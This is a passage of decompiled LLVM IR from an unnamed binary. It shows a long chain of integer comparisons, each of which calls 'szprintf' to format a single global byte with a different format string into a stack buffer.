dec_label_pc_100034d0:                            ; preds = %dec_label_pc_100034c4
  %v2_100034d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100034e4 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100034e4 = zext i8 %v3_100034e4 to i32
  %v4_10003514 = call i32 @szprintf(i32 %v2_100034d0, i32 ptrtoint ([11 x i8]* @global_var_10013d08.62 to i32), i32 %v4_100034e4)
  br label %dec_label_pc_10003518

dec_label_pc_10003518:                            ; preds = %dec_label_pc_100034c4, %dec_label_pc_100034d0
  %v3_1000351c = icmp eq i32 %v2_10003364, 5
  br i1 %v3_1000351c, label %dec_label_pc_10003524, label %dec_label_pc_1000356c

dec_label_pc_10003524:                            ; preds = %dec_label_pc_10003518
  %v2_10003524 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003538 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003538 = zext i8 %v3_10003538 to i32
  %v4_10003568 = call i32 @szprintf(i32 %v2_10003524, i32 ptrtoint ([13 x i8]* @global_var_10013d14.63 to i32), i32 %v4_10003538)
  br label %dec_label_pc_1000356c

dec_label_pc_1000356c:                            ; preds = %dec_label_pc_10003518, %dec_label_pc_10003524
  %v3_10003570 = icmp eq i32 %v2_10003364, 6
  br i1 %v3_10003570, label %dec_label_pc_10003578, label %dec_label_pc_100035c0

dec_label_pc_10003578:                            ; preds = %dec_label_pc_1000356c
  %v2_10003578 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000358c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_1000358c = zext i8 %v3_1000358c to i32
  %v4_100035bc = call i32 @szprintf(i32 %v2_10003578, i32 ptrtoint ([12 x i8]* @global_var_10013d24.64 to i32), i32 %v4_1000358c)
  br label %dec_label_pc_100035c0

dec_label_pc_100035c0:                            ; preds = %dec_label_pc_1000356c, %dec_label_pc_10003578
  %v3_100035c4 = icmp eq i32 %v2_10003364, 7
  br i1 %v3_100035c4, label %dec_label_pc_100035cc, label %dec_label_pc_10003614

dec_label_pc_100035cc:                            ; preds = %dec_label_pc_100035c0
  %v2_100035cc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100035e0 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100035e0 = zext i8 %v3_100035e0 to i32
  %v4_10003610 = call i32 @szprintf(i32 %v2_100035cc, i32 ptrtoint ([13 x i8]* @global_var_10013d30.65 to i32), i32 %v4_100035e0)
  br label %dec_label_pc_10003614

dec_label_pc_10003614:                            ; preds = %dec_label_pc_100035c0, %dec_label_pc_100035cc
  %v3_10003618 = icmp eq i32 %v2_10003364, 8
  br i1 %v3_10003618, label %dec_label_pc_10003620, label %dec_label_pc_10003668

dec_label_pc_10003620:                            ; preds = %dec_label_pc_10003614
  %v2_10003620 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003634 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003634 = zext i8 %v3_10003634 to i32
  %v4_10003664 = call i32 @szprintf(i32 %v2_10003620, i32 ptrtoint ([13 x i8]* @global_var_10013d40.66 to i32), i32 %v4_10003634)
  br label %dec_label_pc_10003668

dec_label_pc_10003668:                            ; preds = %dec_label_pc_10003614, %dec_label_pc_10003620
  %v3_1000366c = icmp eq i32 %v2_10003364, 9
  br i1 %v3_1000366c, label %dec_label_pc_10003674, label %dec_label_pc_100036bc

dec_label_pc_10003674:                            ; preds = %dec_label_pc_10003668
  %v2_10003674 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003688 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003688 = zext i8 %v3_10003688 to i32
  %v4_100036b8 = call i32 @szprintf(i32 %v2_10003674, i32 ptrtoint ([13 x i8]* @global_var_10013d50.67 to i32), i32 %v4_10003688)
  br label %dec_label_pc_100036bc

dec_label_pc_100036bc:                            ; preds = %dec_label_pc_10003668, %dec_label_pc_10003674
  %v3_100036c0 = icmp eq i32 %v2_10003364, 10
  br i1 %v3_100036c0, label %dec_label_pc_100036c8, label %dec_label_pc_10003710

dec_label_pc_100036c8:                            ; preds = %dec_label_pc_100036bc
  %v2_100036c8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100036dc = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100036dc = zext i8 %v3_100036dc to i32
  %v4_1000370c = call i32 @szprintf(i32 %v2_100036c8, i32 ptrtoint ([13 x i8]* @global_var_10013d60.68 to i32), i32 %v4_100036dc)
  br label %dec_label_pc_10003710

dec_label_pc_10003710:                            ; preds = %dec_label_pc_100036bc, %dec_label_pc_100036c8
  %v3_10003714 = icmp eq i32 %v2_10003364, 11
  br i1 %v3_10003714, label %dec_label_pc_1000371c, label %dec_label_pc_10003764

dec_label_pc_1000371c:                            ; preds = %dec_label_pc_10003710
  %v2_1000371c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003730 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003730 = zext i8 %v3_10003730 to i32
  %v4_10003760 = call i32 @szprintf(i32 %v2_1000371c, i32 ptrtoint ([11 x i8]* @global_var_10013d70.69 to i32), i32 %v4_10003730)
  br label %dec_label_pc_10003764

dec_label_pc_10003764:                            ; preds = %dec_label_pc_10003710, %dec_label_pc_1000371c
  %v3_10003768 = icmp eq i32 %v2_10003364, 12
  br i1 %v3_10003768, label %dec_label_pc_10003770, label %dec_label_pc_100037b8

dec_label_pc_10003770:                            ; preds = %dec_label_pc_10003764
  %v2_10003770 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003784 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003784 = zext i8 %v3_10003784 to i32
  %v4_100037b4 = call i32 @szprintf(i32 %v2_10003770, i32 ptrtoint ([13 x i8]* @global_var_10013cdc.59 to i32), i32 %v4_10003784)
  br label %dec_label_pc_100037b8

dec_label_pc_100037b8:                            ; preds = %dec_label_pc_10003764, %dec_label_pc_10003770
  %v3_100037bc = icmp eq i32 %v2_10003364, 13
  br i1 %v3_100037bc, label %dec_label_pc_100037c4, label %dec_label_pc_1000380c

dec_label_pc_100037c4:                            ; preds = %dec_label_pc_100037b8
  %v2_100037c4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100037d8 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100037d8 = zext i8 %v3_100037d8 to i32
  %v4_10003808 = call i32 @szprintf(i32 %v2_100037c4, i32 ptrtoint ([13 x i8]* @global_var_10013d7c.70 to i32), i32 %v4_100037d8)
  br label %dec_label_pc_1000380c

dec_label_pc_1000380c:                            ; preds = %dec_label_pc_100037b8, %dec_label_pc_100037c4
  %v3_10003810 = icmp eq i32 %v2_10003364, 14
  br i1 %v3_10003810, label %dec_label_pc_10003818, label %dec_label_pc_10003860

dec_label_pc_10003818:                            ; preds = %dec_label_pc_1000380c
  %v2_10003818 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000382c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_1000382c = zext i8 %v3_1000382c to i32
  %v4_1000385c = call i32 @szprintf(i32 %v2_10003818, i32 ptrtoint ([13 x i8]* @global_var_10013d8c.71 to i32), i32 %v4_1000382c)
  br label %dec_label_pc_10003860

dec_label_pc_10003860:                            ; preds = %dec_label_pc_1000380c, %dec_label_pc_10003818
  %v3_10003864 = icmp eq i32 %v2_10003364, 15
  br i1 %v3_10003864, label %dec_label_pc_1000386c, label %dec_label_pc_100038b4

dec_label_pc_1000386c:                            ; preds = %dec_label_pc_10003860
  %v2_1000386c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003880 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003880 = zext i8 %v3_10003880 to i32
  %v4_100038b0 = call i32 @szprintf(i32 %v2_1000386c, i32 ptrtoint ([13 x i8]* @global_var_10013d9c.72 to i32), i32 %v4_10003880)
  br label %dec_label_pc_100038b4

dec_label_pc_100038b4:                            ; preds = %dec_label_pc_10003860, %dec_label_pc_1000386c
  %v3_100038b8 = icmp eq i32 %v2_10003364, 16
  br i1 %v3_100038b8, label %dec_label_pc_100038c0, label %dec_label_pc_10003908

dec_label_pc_100038c0:                            ; preds = %dec_label_pc_100038b4
  %v2_100038c0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100038d4 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100038d4 = zext i8 %v3_100038d4 to i32
  %v4_10003904 = call i32 @szprintf(i32 %v2_100038c0, i32 ptrtoint ([13 x i8]* @global_var_10013dac.73 to i32), i32 %v4_100038d4)
  br label %dec_label_pc_10003908

dec_label_pc_10003908:                            ; preds = %dec_label_pc_100038b4, %dec_label_pc_100038c0
  %v3_1000390c = icmp eq i32 %v2_10003364, 17
  br i1 %v3_1000390c, label %dec_label_pc_10003914, label %dec_label_pc_1000395c

dec_label_pc_10003914:                            ; preds = %dec_label_pc_10003908
  %v2_10003914 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003928 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003928 = zext i8 %v3_10003928 to i32
  %v4_10003958 = call i32 @szprintf(i32 %v2_10003914, i32 ptrtoint ([13 x i8]* @global_var_10013dbc.74 to i32), i32 %v4_10003928)
  br label %dec_label_pc_1000395c

dec_label_pc_1000395c:                            ; preds = %dec_label_pc_10003908, %dec_label_pc_10003914
  %v3_10003960 = icmp eq i32 %v2_10003364, 18
  br i1 %v3_10003960, label %dec_label_pc_10003968, label %dec_label_pc_100039b0

dec_label_pc_10003968:                            ; preds = %dec_label_pc_1000395c
  %v2_10003968 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000397c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_1000397c = zext i8 %v3_1000397c to i32
  %v4_100039ac = call i32 @szprintf(i32 %v2_10003968, i32 ptrtoint ([13 x i8]* @global_var_10013dcc.75 to i32), i32 %v4_1000397c)
  br label %dec_label_pc_100039b0

dec_label_pc_100039b0:                            ; preds = %dec_label_pc_1000395c, %dec_label_pc_10003968
  %v3_100039b4 = icmp eq i32 %v2_10003364, 19
  br i1 %v3_100039b4, label %dec_label_pc_100039bc, label %dec_label_pc_10003a04

dec_label_pc_100039bc:                            ; preds = %dec_label_pc_100039b0
  %v2_100039bc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100039d0 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100039d0 = zext i8 %v3_100039d0 to i32
  %v4_10003a00 = call i32 @szprintf(i32 %v2_100039bc, i32 ptrtoint ([11 x i8]* @global_var_10013ddc.76 to i32), i32 %v4_100039d0)
  br label %dec_label_pc_10003a04

dec_label_pc_10003a04:                            ; preds = %dec_label_pc_100039b0, %dec_label_pc_100039bc
  %v3_10003a08 = icmp eq i32 %v2_10003364, 20
  br i1 %v3_10003a08, label %dec_label_pc_10003a10, label %dec_label_pc_10003a58

dec_label_pc_10003a10:                            ; preds = %dec_label_pc_10003a04
  %v2_10003a10 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003a24 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003a24 = zext i8 %v3_10003a24 to i32
  %v4_10003a54 = call i32 @szprintf(i32 %v2_10003a10, i32 ptrtoint ([12 x i8]* @global_var_10013de8.77 to i32), i32 %v4_10003a24)
  br label %dec_label_pc_10003a58

dec_label_pc_10003a58:                            ; preds = %dec_label_pc_10003a04, %dec_label_pc_10003a10
  %v3_10003a5c = icmp eq i32 %v2_10003364, 21
  br i1 %v3_10003a5c, label %dec_label_pc_10003a64, label %dec_label_pc_10003aac

dec_label_pc_10003a64:                            ; preds = %dec_label_pc_10003a58
  %v2_10003a64 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003a78 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003a78 = zext i8 %v3_10003a78 to i32
  %v4_10003aa8 = call i32 @szprintf(i32 %v2_10003a64, i32 ptrtoint ([13 x i8]* @global_var_10013df4.78 to i32), i32 %v4_10003a78)
  br label %dec_label_pc_10003aac

dec_label_pc_10003aac:                            ; preds = %dec_label_pc_10003a58, %dec_label_pc_10003a64
  %v3_10003ab0 = icmp eq i32 %v2_10003364, 22
  br i1 %v3_10003ab0, label %dec_label_pc_10003ab8, label %dec_label_pc_10003b00

dec_label_pc_10003ab8:                            ; preds = %dec_label_pc_10003aac
  %v2_10003ab8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003acc = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003acc = zext i8 %v3_10003acc to i32
  %v4_10003afc = call i32 @szprintf(i32 %v2_10003ab8, i32 ptrtoint ([11 x i8]* @global_var_10013e04.79 to i32), i32 %v4_10003acc)
  br label %dec_label_pc_10003b00

dec_label_pc_10003b00:                            ; preds = %dec_label_pc_10003aac, %dec_label_pc_10003ab8
  %v3_10003b04 = icmp eq i32 %v2_10003364, 23
  br i1 %v3_10003b04, label %dec_label_pc_10003b0c, label %dec_label_pc_10003b54

dec_label_pc_10003b0c:                            ; preds = %dec_label_pc_10003b00
  %v2_10003b0c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003b20 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003b20 = zext i8 %v3_10003b20 to i32
  %v4_10003b50 = call i32 @szprintf(i32 %v2_10003b0c, i32 ptrtoint ([11 x i8]* @global_var_10013e10.80 to i32), i32 %v4_10003b20)
  br label %dec_label_pc_10003b54

dec_label_pc_10003b54:                            ; preds = %dec_label_pc_10003b00, %dec_label_pc_10003b0c
  %v3_10003b58 = icmp eq i32 %v2_10003364, 24
  br i1 %v3_10003b58, label %dec_label_pc_10003b60, label %dec_label_pc_10003ba8

dec_label_pc_10003b60:                            ; preds = %dec_label_pc_10003b54
  %v2_10003b60 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003b74 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003b74 = zext i8 %v3_10003b74 to i32
  %v4_10003ba4 = call i32 @szprintf(i32 %v2_10003b60, i32 ptrtoint ([12 x i8]* @global_var_10013e1c.81 to i32), i32 %v4_10003b74)
  br label %dec_label_pc_10003ba8

dec_label_pc_10003ba8:                            ; preds = %dec_label_pc_10003b54, %dec_label_pc_10003b60
  %v3_10003bac = icmp eq i32 %v2_10003364, 25
  br i1 %v3_10003bac, label %dec_label_pc_10003bb4, label %dec_label_pc_10003bfc

dec_label_pc_10003bb4:                            ; preds = %dec_label_pc_10003ba8
  %v2_10003bb4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003bc8 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003bc8 = zext i8 %v3_10003bc8 to i32
  %v4_10003bf8 = call i32 @szprintf(i32 %v2_10003bb4, i32 ptrtoint ([12 x i8]* @global_var_10013e28.82 to i32), i32 %v4_10003bc8)
  br label %dec_label_pc_10003bfc

dec_label_pc_10003bfc:                            ; preds = %dec_label_pc_10003ba8, %dec_label_pc_10003bb4
  %v3_10003c00 = icmp eq i32 %v2_10003364, 26
  br i1 %v3_10003c00, label %dec_label_pc_10003c08, label %dec_label_pc_10003c50

dec_label_pc_10003c08:                            ; preds = %dec_label_pc_10003bfc
  %v2_10003c08 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003c1c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003c1c = zext i8 %v3_10003c1c to i32
  %v4_10003c4c = call i32 @szprintf(i32 %v2_10003c08, i32 ptrtoint ([12 x i8]* @global_var_10013e34.83 to i32), i32 %v4_10003c1c)
  br label %dec_label_pc_10003c50

dec_label_pc_10003c50:                            ; preds = %dec_label_pc_10003bfc, %dec_label_pc_10003c08
  %v3_10003c54 = icmp eq i32 %v2_10003364, 27
  br i1 %v3_10003c54, label %dec_label_pc_10003c5c, label %dec_label_pc_10003ca4

dec_label_pc_10003c5c:                            ; preds = %dec_label_pc_10003c50
  %v2_10003c5c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003c70 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003c70 = zext i8 %v3_10003c70 to i32
  %v4_10003ca0 = call i32 @szprintf(i32 %v2_10003c5c, i32 ptrtoint ([13 x i8]* @global_var_10013e40.84 to i32), i32 %v4_10003c70)
  br label %dec_label_pc_10003ca4

dec_label_pc_10003ca4:                            ; preds = %dec_label_pc_10003c50, %dec_label_pc_10003c5c
  %v3_10003ca8 = icmp eq i32 %v2_10003364, 28
  br i1 %v3_10003ca8, label %dec_label_pc_10003cb0, label %dec_label_pc_10003cf8

dec_label_pc_10003cb0:                            ; preds = %dec_label_pc_10003ca4
  %v2_10003cb0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003cc4 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003cc4 = zext i8 %v3_10003cc4 to i32
  %v4_10003cf4 = call i32 @szprintf(i32 %v2_10003cb0, i32 ptrtoint ([13 x i8]* @global_var_10013e50.85 to i32), i32 %v4_10003cc4)
  br label %dec_label_pc_10003cf8

dec_label_pc_10003cf8:                            ; preds = %dec_label_pc_10003ca4, %dec_label_pc_10003cb0
  %v3_10003cfc = icmp eq i32 %v2_10003364, 29
  br i1 %v3_10003cfc, label %dec_label_pc_10003d04, label %dec_label_pc_10003d4c

dec_label_pc_10003d04:                            ; preds = %dec_label_pc_10003cf8
  %v2_10003d04 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003d18 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003d18 = zext i8 %v3_10003d18 to i32
  %v4_10003d48 = call i32 @szprintf(i32 %v2_10003d04, i32 ptrtoint ([12 x i8]* @global_var_10013e60.86 to i32), i32 %v4_10003d18)
  br label %dec_label_pc_10003d4c

dec_label_pc_10003d4c:                            ; preds = %dec_label_pc_10003cf8, %dec_label_pc_10003d04
  %v3_10003d50 = icmp eq i32 %v2_10003364, 30
  br i1 %v3_10003d50, label %dec_label_pc_10003d58, label %dec_label_pc_10003da0

dec_label_pc_10003d58:                            ; preds = %dec_label_pc_10003d4c
  %v2_10003d58 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003d6c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003d6c = zext i8 %v3_10003d6c to i32
  %v4_10003d9c = call i32 @szprintf(i32 %v2_10003d58, i32 ptrtoint ([13 x i8]* @global_var_10013e6c.87 to i32), i32 %v4_10003d6c)
  br label %dec_label_pc_10003da0

dec_label_pc_10003da0:                            ; preds = %dec_label_pc_10003d4c, %dec_label_pc_10003d58
  %v3_10003da4 = icmp eq i32 %v2_10003364, 31
  br i1 %v3_10003da4, label %dec_label_pc_10003dac, label %dec_label_pc_10003df4

dec_label_pc_10003dac:                            ; preds = %dec_label_pc_10003da0
  %v2_10003dac = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003dc0 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003dc0 = zext i8 %v3_10003dc0 to i32
  %v4_10003df0 = call i32 @szprintf(i32 %v2_10003dac, i32 ptrtoint ([12 x i8]* @global_var_10013e7c.88 to i32), i32 %v4_10003dc0)
  br label %dec_label_pc_10003df4

dec_label_pc_10003df4:                            ; preds = %dec_label_pc_10003da0, %dec_label_pc_10003dac
  %v3_10003df8 = icmp eq i32 %v2_10003364, 32
  br i1 %v3_10003df8, label %dec_label_pc_10003e00, label %dec_label_pc_10003e48

dec_label_pc_10003e00:                            ; preds = %dec_label_pc_10003df4
  %v2_10003e00 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003e14 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003e14 = zext i8 %v3_10003e14 to i32
  %v4_10003e44 = call i32 @szprintf(i32 %v2_10003e00, i32 ptrtoint ([11 x i8]* @global_var_10013e88.89 to i32), i32 %v4_10003e14)
  br label %dec_label_pc_10003e48

dec_label_pc_10003e48:                            ; preds = %dec_label_pc_10003df4, %dec_label_pc_10003e00
  %v3_10003e4c = icmp eq i32 %v2_10003364, 33
  br i1 %v3_10003e4c, label %dec_label_pc_10003e54, label %dec_label_pc_10003e9c

dec_label_pc_10003e54:                            ; preds = %dec_label_pc_10003e48
  %v2_10003e54 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003e68 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003e68 = zext i8 %v3_10003e68 to i32
  %v4_10003e98 = call i32 @szprintf(i32 %v2_10003e54, i32 ptrtoint ([12 x i8]* @global_var_10013e94.90 to i32), i32 %v4_10003e68)
  br label %dec_label_pc_10003e9c

dec_label_pc_10003e9c:                            ; preds = %dec_label_pc_10003e48, %dec_label_pc_10003e54
  %v3_10003ea0 = icmp eq i32 %v2_10003364, 34
  br i1 %v3_10003ea0, label %dec_label_pc_10003ea8, label %dec_label_pc_10003ef0

dec_label_pc_10003ea8:                            ; preds = %dec_label_pc_10003e9c
  %v2_10003ea8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003ebc = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003ebc = zext i8 %v3_10003ebc to i32
  %v4_10003eec = call i32 @szprintf(i32 %v2_10003ea8, i32 ptrtoint ([12 x i8]* @global_var_10013ea0.91 to i32), i32 %v4_10003ebc)
  br label %dec_label_pc_10003ef0

dec_label_pc_10003ef0:                            ; preds = %dec_label_pc_10003e9c, %dec_label_pc_10003ea8
  %v3_10003ef4 = icmp eq i32 %v2_10003364, 35
  br i1 %v3_10003ef4, label %dec_label_pc_10003efc, label %dec_label_pc_10003f44

dec_label_pc_10003efc:                            ; preds = %dec_label_pc_10003ef0
  %v2_10003efc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003f10 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003f10 = zext i8 %v3_10003f10 to i32
  %v4_10003f40 = call i32 @szprintf(i32 %v2_10003efc, i32 ptrtoint ([12 x i8]* @global_var_10013eac.92 to i32), i32 %v4_10003f10)
  br label %dec_label_pc_10003f44

dec_label_pc_10003f44:                            ; preds = %dec_label_pc_10003ef0, %dec_label_pc_10003efc
  %v3_10003f48 = icmp eq i32 %v2_10003364, 36
  br i1 %v3_10003f48, label %dec_label_pc_10003f50, label %dec_label_pc_10003f98

dec_label_pc_10003f50:                            ; preds = %dec_label_pc_10003f44
  %v2_10003f50 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003f64 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003f64 = zext i8 %v3_10003f64 to i32
  %v4_10003f94 = call i32 @szprintf(i32 %v2_10003f50, i32 ptrtoint ([12 x i8]* @global_var_10013eb8.93 to i32), i32 %v4_10003f64)
  br label %dec_label_pc_10003f98

dec_label_pc_10003f98:                            ; preds = %dec_label_pc_10003f44, %dec_label_pc_10003f50
  %v3_10003f9c = icmp eq i32 %v2_10003364, 37
  br i1 %v3_10003f9c, label %dec_label_pc_10003fa4, label %dec_label_pc_10003fec

dec_label_pc_10003fa4:                            ; preds = %dec_label_pc_10003f98
  %v2_10003fa4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003fb8 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003fb8 = zext i8 %v3_10003fb8 to i32
  %v4_10003fe8 = call i32 @szprintf(i32 %v2_10003fa4, i32 ptrtoint ([12 x i8]* @global_var_10013ec4.94 to i32), i32 %v4_10003fb8)
  br label %dec_label_pc_10003fec

dec_label_pc_10003fec:                            ; preds = %dec_label_pc_10003f98, %dec_label_pc_10003fa4
  %v3_10003ff0 = icmp eq i32 %v2_10003364, 38
  br i1 %v3_10003ff0, label %dec_label_pc_10003ff8, label %dec_label_pc_10004040

dec_label_pc_10003ff8:                            ; preds = %dec_label_pc_10003fec
  %v2_10003ff8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000400c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_1000400c = zext i8 %v3_1000400c to i32
  %v4_1000403c = call i32 @szprintf(i32 %v2_10003ff8, i32 ptrtoint ([13 x i8]* @global_var_10013ed0.95 to i32), i32 %v4_1000400c)
  br label %dec_label_pc_10004040

dec_label_pc_10004040:                            ; preds = %dec_label_pc_10003fec, %dec_label_pc_10003ff8
  %v3_10004044 = icmp eq i32 %v2_10003364, 39
  br i1 %v3_10004044, label %dec_label_pc_1000404c, label %dec_label_pc_10004094

dec_label_pc_1000404c:                            ; preds = %dec_label_pc_10004040
  %v2_1000404c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004060 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004060 = zext i8 %v3_10004060 to i32
  %v4_10004090 = call i32 @szprintf(i32 %v2_1000404c, i32 ptrtoint ([13 x i8]* @global_var_10013ee0.96 to i32), i32 %v4_10004060)
  br label %dec_label_pc_10004094

dec_label_pc_10004094:                            ; preds = %dec_label_pc_10004040, %dec_label_pc_1000404c
  %v3_10004098 = icmp eq i32 %v2_10003364, 40
  br i1 %v3_10004098, label %dec_label_pc_100040a0, label %dec_label_pc_100040e8

dec_label_pc_100040a0:                            ; preds = %dec_label_pc_10004094
  %v2_100040a0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100040b4 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100040b4 = zext i8 %v3_100040b4 to i32
  %v4_100040e4 = call i32 @szprintf(i32 %v2_100040a0, i32 ptrtoint ([13 x i8]* @global_var_10013ed0.95 to i32), i32 %v4_100040b4)
  br label %dec_label_pc_100040e8

dec_label_pc_100040e8:                            ; preds = %dec_label_pc_10004094, %dec_label_pc_100040a0
  %v3_100040ec = icmp eq i32 %v2_10003364, 41
  br i1 %v3_100040ec, label %dec_label_pc_100040f4, label %dec_label_pc_1000413c

dec_label_pc_100040f4:                            ; preds = %dec_label_pc_100040e8
  %v2_100040f4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004108 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004108 = zext i8 %v3_10004108 to i32
  %v4_10004138 = call i32 @szprintf(i32 %v2_100040f4, i32 ptrtoint ([11 x i8]* @global_var_10013ef0.97 to i32), i32 %v4_10004108)
  br label %dec_label_pc_1000413c

dec_label_pc_1000413c:                            ; preds = %dec_label_pc_100040e8, %dec_label_pc_100040f4
  %v3_10004140 = icmp eq i32 %v2_10003364, 42
  br i1 %v3_10004140, label %dec_label_pc_10004148, label %dec_label_pc_10004190

dec_label_pc_10004148:                            ; preds = %dec_label_pc_1000413c
  %v2_10004148 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000415c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_1000415c = zext i8 %v3_1000415c to i32
  %v4_1000418c = call i32 @szprintf(i32 %v2_10004148, i32 ptrtoint ([12 x i8]* @global_var_10013efc.98 to i32), i32 %v4_1000415c)
  br label %dec_label_pc_10004190

dec_label_pc_10004190:                            ; preds = %dec_label_pc_1000413c, %dec_label_pc_10004148
  %v3_10004194 = icmp eq i32 %v2_10003364, 43
  br i1 %v3_10004194, label %dec_label_pc_1000419c, label %dec_label_pc_100041e4

dec_label_pc_1000419c:                            ; preds = %dec_label_pc_10004190
  %v2_1000419c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100041b0 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100041b0 = zext i8 %v3_100041b0 to i32
  %v4_100041e0 = call i32 @szprintf(i32 %v2_1000419c, i32 ptrtoint ([13 x i8]* @global_var_10013f08.99 to i32), i32 %v4_100041b0)
  br label %dec_label_pc_100041e4

dec_label_pc_100041e4:                            ; preds = %dec_label_pc_10004190, %dec_label_pc_1000419c
  %v3_100041e8 = icmp eq i32 %v2_10003364, 44
  br i1 %v3_100041e8, label %dec_label_pc_100041f0, label %dec_label_pc_10004238

dec_label_pc_100041f0:                            ; preds = %dec_label_pc_100041e4
  %v2_100041f0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004204 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004204 = zext i8 %v3_10004204 to i32
  %v4_10004234 = call i32 @szprintf(i32 %v2_100041f0, i32 ptrtoint ([12 x i8]* @global_var_10013f18.100 to i32), i32 %v4_10004204)
  br label %dec_label_pc_10004238

dec_label_pc_10004238:                            ; preds = %dec_label_pc_100041e4, %dec_label_pc_100041f0
  %v3_1000423c = icmp eq i32 %v2_10003364, 45
  br i1 %v3_1000423c, label %dec_label_pc_10004244, label %dec_label_pc_1000428c

dec_label_pc_10004244:                            ; preds = %dec_label_pc_10004238
  %v2_10004244 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004258 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10004258 = zext i8 %v3_10004258 to i32
  %v4_10004288 = call i32 @szprintf(i32 %v2_10004244, i32 ptrtoint ([13 x i8]* @global_var_10013f24.101 to i32), i32 %v4_10004258)
  br label %dec_label_pc_1000428c

dec_label_pc_1000428c:                            ; preds = %dec_label_pc_10004238, %dec_label_pc_10004244
  %v3_10004290 = icmp eq i32 %v2_10003364, 46
  br i1 %v3_10004290, label %dec_label_pc_10004298, label %dec_label_pc_100042e0

dec_label_pc_10004298:                            ; preds = %dec_label_pc_1000428c
  %v2_10004298 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100042ac = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100042ac = zext i8 %v3_100042ac to i32
  %v4_100042dc = call i32 @szprintf(i32 %v2_10004298, i32 ptrtoint ([13 x i8]* @global_var_10013f34.102 to i32), i32 %v4_100042ac)
  br label %dec_label_pc_100042e0

dec_label_pc_100042e0:                            ; preds = %dec_label_pc_1000428c, %dec_label_pc_10004298
  %v3_100042e4 = icmp eq i32 %v2_10003364, 47
  br i1 %v3_100042e4, label %dec_label_pc_100042ec, label %dec_label_pc_10004334

dec_label_pc_100042ec:                            ; preds = %dec_label_pc_100042e0
  %v2_100042ec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004300 = load i8, i8* @global_var_1002e603.56, align 1
